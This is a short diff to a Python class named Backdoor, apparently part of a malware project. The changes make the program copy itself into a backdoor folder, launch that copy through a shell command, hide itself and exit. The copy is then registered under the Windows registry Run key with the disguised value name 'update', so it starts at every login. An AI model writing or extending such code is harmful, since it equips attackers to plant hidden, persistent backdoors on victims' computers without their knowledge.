@@ -22,11 +22,14 @@ class Backdoor:
         if self.path != self.bd_path:
             try:
                 shutil.copy2(self.path, self.bd_path)      # Copy the file to the backdoor folder
-                os.startfile(self.bd_path)          # Start the file
+                os.system("start " + self.bd_path)         # Start the backdoor
                 self.hide()
                 os._exit(1)
             except: pass
-        else: return True
+        else: 
+            subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v update /t REG_SZ /d "' + self.bd_path + '" /f', shell=True)
+            return True
+
 
 
 if __name__ == "__main__":
